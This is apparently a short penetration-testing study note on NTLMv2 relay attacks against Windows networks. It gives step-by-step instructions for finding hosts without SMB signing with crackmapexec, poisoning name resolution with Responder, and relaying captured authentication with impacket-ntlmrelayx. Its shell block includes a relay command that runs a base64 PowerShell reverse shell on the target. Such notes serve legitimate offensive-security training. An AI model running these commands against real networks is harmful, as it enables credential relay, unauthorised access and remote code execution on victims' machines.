


Ntlmv2 has a challenge/response component to it, so each hash is unique and cannot be used in pass-the-hash.  
Ntlmv2 can however be used in relay, but you’ll have to set up a proper relay and capture it again. 

#### steps 
1) Use crackmapexec‘s genrelay flag to get a list of all hosts that don’t enforce SMB signing - it’ll output a targets list.

2) Run ntlmrelayx with the target file from above. You may wish to also run it with socks and smb2support flags.

3) Config responder to disable HTTP and SMB since ntlmrelayx will be running (if you did not use `--no-http-server` in ntlmrelayx)

4) run responder.


```shell
#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
cat /etc/responder/Responder.conf | grep 'SMB ='

responder -I <interface name>

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'

```
